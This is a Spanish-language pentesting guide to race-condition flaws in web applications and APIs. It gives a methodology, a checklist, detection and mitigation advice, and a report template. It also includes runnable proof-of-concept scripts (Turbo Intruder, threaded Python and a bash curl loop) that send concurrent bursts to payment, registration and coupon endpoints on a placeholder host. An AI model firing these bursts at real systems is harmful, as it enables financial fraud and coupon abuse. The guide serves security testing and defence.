# Guía de Condiciones de Carrera

## Resumen

**Qué es:** Una condición de carrera ocurre cuando distintos procesos, peticiones o hilos acceden y modifican recursos compartidos concurrentemente, generando resultados inesperados e inseguros.
**Por qué importa:** El aprovechamiento de condiciones de carrera puede permitir bypass de controles, duplicidad de transacciones, modificaciones no autorizadas y ataques de escalado/crash en aplicaciones web/APIs.
**Cuándo aplicarlo:** Pentesting en endpoints críticos de negocio, pagos, compras, transferencias y modificaciones de estado en aplicaciones concurrentes.

---

## Contexto

**Supuestos:**

- Aplicaciones web/API que permiten múltiples operaciones concurrentes (compra, transferencia, registro, actualización de estado, etc.).
- Capacidades para lanzar peticiones en paralelo (scripts, herramientas, extensiones o proxies).
- Acceso al endpoint vía HTTP(s), gRPC o websockets.
- Herramientas: Burp Suite (Turbo Intruder), ffuf, curl en bash scripting, OWASP ZAP.

**Límites:**

- No cubre condiciones de carrera a bajo nivel (kernel, threading interno).
- Enfocado en análisis black/grey box, sin modificar el código fuente original.

---

## Metodología

1. **Reconocimiento del endpoint crítico:**
   - Identifica operaciones sensibles (pagos, transferencias, cambio de contraseña, compra, registro único).
2. **Verificación de control de concurrencia:**
   - Revisa si hay lock, semáforos o protección declarada en la lógica del backend.
3. **Preparación del ataque:**
   - Diseña payloads idénticos (o variantes mínimas) para disparar requests concurrentes.
   - Configura la herramienta para lanzar ráfagas de peticiones (paralelismo máximo posible).
4. **Ejecución de pruebas:**
   - Lanza todas las peticiones en paralelo (con Turbo Intruder, threads Python, bash loops).
   - Monitorea respuestas: duplicidad de transacciones, resultados incoherentes, errores o bloqueos inesperados.
5. **Recopilación de evidencia y análisis:**
   - Comparar estados antes y después (número de recursos creados/modificados, logs, saldos, asignaciones, confirmaciones).

**Checklist de verificación:**

- Protecciones backend contra concurrencia (locks, transacciones atómicas, control de repetidos).
- Registros únicos manteniendo idempotencia.
- Lógica de negocio consistente sin duplicidades inesperadas.
- Respuestas HTTP consistentes frente a ráfagas.
- No hay errores 500/502/504 ni inconsistencias de estado.

---

## Pruebas Manuales

**1. Ataque con Turbo Intruder (Burp Suite):**

```python
requests = [
  Request("POST /compra HTTP/1.1\nHost: victima.com\n...\n\nitemId=1&cantidad=1"),
] * 50
```

- Ejecutar todos en paralelo y revisar si se compran más ítems de lo permitido.

**2. Prueba con cURL + Bash (registro duplicado):**

```bash
for i in {1..20}; do
  curl -X POST https://victima.com/api/register -d '{ "usuario": "test1" }' &
done
wait
```

- Comprobar si se registran múltiples usuarios idénticos.

**3. Race Condition en transferencia de saldo:**

- Lanzar varias peticiones de `POST /transfer` en simultáneo desde una cuenta con saldo límite.
- Analizar si el saldo se vuelve negativo o se transfiere más de lo permitido.

**4. Doble uso de token/cupón:**

- Enviar simultáneamente peticiones de canje de un cupón de un solo uso.
- Revisar si el sistema permite múltiple canje.

---

## PoC Automatizada

**Turbo Intruder:**

```python
from turbo_intruder import Request, Engine

def queue_requests(target, engine):
    for _ in range(100):
        engine.queue(Request('POST /api/pay HTTP/1.1\nHost: victima.com\nContent-Type: application/json\n\n{"monto":100,"cuenta":"abc"}'))

def handle_response(req, interesting):
    if 'Success' in req.response.text:
        interesting.append(req)
```

**Python con threads:**

```python
import requests, threading

def race():
    requests.post('https://victima.com/api/pay', json={"monto":100,"cuenta":"abc"})

threads = [threading.Thread(target=race) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

---

## Explotación y Automatización

- **Burst buy:** Compra masiva de un recurso limitado en milisegundos.
- **Duplicate payment:** Múltiples pagos acreditados.
- **Multi-register:** Duplicados de usuarios/referencias únicas.
- **Token/Coupon abuse:** Validaciones que permiten varios usos simultáneos.

---

## Impacto

- **Fraude financiero:** Múltiples pagos/transferencias/deducciones con un solo saldo.
- **DoS lógico:** Saturación de recursos, creación masiva de objetos.
- **Manipulación de privilegios/accesos:** Registro de información duplicada, escalado por repetición.
- **Pérdida de integridad:** Inconsistencia en el estado de la base de datos.

**OWASP/CWE:** API3 Excessive Data Exposure, API7 Security Misconfig, CWE-362 Race Condition, CWE-352 CSRF.

---

## Detección

- Logs de múltiples operaciones en el mismo recurso/cuenta en milisegundos.
- Alertas de registros concurrentes, duplicidades.
- Errores de estado, saldo negativo o confirmaciones incoherentes.
- Trazas de requests simultáneas desde la misma IP/cuenta.

---

## Mitigación

- Implementar locks y transacciones atómicas en los endpoints críticos.
- Uso de campos únicos y validaciones a nivel de base de datos y API.
- Respuestas únicas ante duplicidad y control de idempotencia.
- Rate limiting en endpoints sensibles.
- Pruebas post-fix con ráfagas y automatización.

---

## Errores Comunes

- Falta de protección concurrente a nivel aplicación y base de datos.
- Suponer que el frontend impide duplicidad.
- Omitir validación final en lógica backend.
- No revisar logs en milisegundos de operaciones críticas.

---

## Reporte

**Título:** Condición de carrera en endpoint permite duplicidad y abuso de lógica crítica
**Impacto:** Fraude, DoS lógico, exfiltración y inconsistencias de negocio
**Pasos:**

1. Disparar múltiples peticiones concurrentes en operación crítica
2. Confirmar duplicidad/inconsistencia en respuestas y logs
3. Evidencia de registros/pagos/acciones repetidas
   **Mitigación:** Locks, validaciones únicas, atomicidad y monitoreo de concurrencia
